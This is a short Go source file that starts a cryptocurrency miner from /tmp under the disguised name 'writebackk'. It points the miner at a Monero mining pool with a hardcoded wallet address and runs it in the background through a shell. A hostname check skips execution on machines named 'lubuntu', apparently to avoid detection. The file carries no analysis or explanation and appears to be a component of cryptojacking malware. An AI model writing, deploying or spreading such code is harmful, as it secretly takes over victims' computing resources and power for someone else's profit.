//exec vkzmn 


package main


import (

"strings"
"fmt"
"os/exec"

)





func    exec_vk () {


pool  :=  [] string {
  
"--url pool.supportxmr.com:80" ,

}






for  i :=  0  ; i <  1 ;  i++ {

user :=   "--user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy"  
pass :=   "--pass  atila"   
dl :=      "--donate-level  1"   


         

config  :=  fmt.Sprintf( "%s %s %s %s  & " ,  pool[i], user , pass,  dl )
 

//fmt.Println(config)
 

vk   :=  exec.Command("sh" , "-c", "cd /tmp ;  ./writebackk " + config )



ret_n  := uname_n()
  
if strings.Contains(ret_n, "lubuntu") { fmt.Println("not in  logical") ; return }


go vk.Start()


}


   }


